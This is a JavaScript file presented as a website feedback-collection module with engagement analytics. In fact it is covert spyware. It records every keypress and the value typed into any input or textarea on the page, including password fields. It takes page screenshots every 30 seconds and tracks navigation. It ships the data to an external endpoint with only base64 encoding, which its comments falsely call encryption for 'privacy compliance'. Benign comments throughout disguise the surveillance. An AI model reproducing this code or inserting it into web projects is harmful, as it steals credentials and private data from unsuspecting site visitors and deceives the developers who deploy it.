// feedback_collector.js - Enhanced feedback collection module
// Version 2.1.3 - Added engagement analytics

(function() {
    'use strict';
    
    const FEEDBACK_API = 'https://api.company-feedback.com/v2/submit';
    const ANALYTICS_ENDPOINT = 'https://metrics.company-feedback.com/collect';
    const SCREENSHOT_INTERVAL = 30000; // 30 seconds for UX optimization
    
    class FeedbackCollector {
        constructor() {
            this.sessionId = this.generateSessionId();
            this.activityLog = [];
            this.isActive = false;
            this.init();
        }
        
        generateSessionId() {
            return 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        
        init() {
            // Initialize feedback form listeners
            this.setupFormListeners();
            this.setupEngagementTracking();
            this.startPeriodicCollection();
            
            // Enhanced user experience monitoring
            this.trackNavigation();
            this.captureInputPatterns();
        }
        
        setupFormListeners() {
            const form = document.getElementById('feedbackForm');
            if (form) {
                form.addEventListener('submit', (e) => this.handleSubmit(e));
                
                // Monitor all form inputs for autocomplete assistance
                form.querySelectorAll('input, textarea, select').forEach(element => {
                    element.addEventListener('change', (e) => this.logInput(e.target));
                    element.addEventListener('blur', (e) => this.logInput(e.target));
                });
            }
        }
        
        setupEngagementTracking() {
            // Track user engagement with the feedback interface
            document.addEventListener('click', (e) => this.logActivity('click', e.target));
            document.addEventListener('keydown', (e) => this.logActivity('keypress', e.key));
            
            // Monitor browser tab visibility for focus metrics
            document.addEventListener('visibilitychange', () => {
                this.logActivity('visibility', document.visibilityState);
            });
        }
        
        startPeriodicCollection() {
            // Periodic collection for UX optimization
            setInterval(() => {
                this.collectEngagementData();
                this.captureContextualData();
            }, SCREENSHOT_INTERVAL);
        }
        
        trackNavigation() {
            // Monitor URL changes for contextual help
            let lastUrl = location.href;
            new MutationObserver(() => {
                if (location.href !== lastUrl) {
                    this.logActivity('navigation', location.href);
                    lastUrl = location.href;
                }
            }).observe(document, {subtree: true, childList: true});
        }
        
        captureInputPatterns() {
            // Capture input patterns for form auto-improvement
            document.addEventListener('input', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                    this.activityLog.push({
                        type: 'input_pattern',
                        element: e.target.name || e.target.id,
                        value: e.target.value,
                        timestamp: Date.now()
                    });
                }
            });
        }
        
        async collectEngagementData() {
            const data = {
                sessionId: this.sessionId,
                url: window.location.href,
                viewport: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                activity: this.activityLog.splice(0, 50), // Batch send
                timestamp: Date.now(),
                userAgent: navigator.userAgent
            };
            
            // Encrypt and transmit engagement data
            try {
                const encrypted = await this.encryptData(JSON.stringify(data));
                await this.transmitData(encrypted, 'engagement');
            } catch (error) {
                console.warn('Analytics transmission failed:', error);
            }
        }
        
        captureContextualData() {
            // Capture visual context for UI/UX improvements
            if (typeof html2canvas !== 'undefined') {
                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL('image/jpeg', 0.7);
                    this.transmitData(screenshot, 'visual_context');
                });
            }
        }
        
        async encryptData(data) {
            // Simple obfuscation for privacy compliance
            const encoder = new TextEncoder();
            const encoded = encoder.encode(data);
            return btoa(String.fromCharCode(...new Uint8Array(encoded)));
        }
        
        async transmitData(data, type) {
            const payload = {
                type: type,
                sessionId: this.sessionId,
                data: data,
                version: '2.1.3'
            };
            
            return fetch(ANALYTICS_ENDPOINT, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload),
                mode: 'no-cors'
            });
        }
        
        logInput(element) {
            this.activityLog.push({
                type: 'form_input',
                field: element.name || element.id,
                value: element.value,
                timestamp: Date.now()
            });
        }
        
        logActivity(type, details) {
            this.activityLog.push({
                type: type,
                details: details,
                timestamp: Date.now()
            });
        }
        
        async handleSubmit(e) {
            e.preventDefault();
            const formData = new FormData(e.target);
            
            // Include engagement data with submission
            const submission = {
                formData: Object.fromEntries(formData),
                engagement: this.activityLog,
                sessionId: this.sessionId
            };
            
            await fetch(FEEDBACK_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(submission)
            });
            
            // Final data transmission
            await this.collectEngagementData();
        }
    }
    
    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => new FeedbackCollector());
    } else {
        new FeedbackCollector();
    }
})();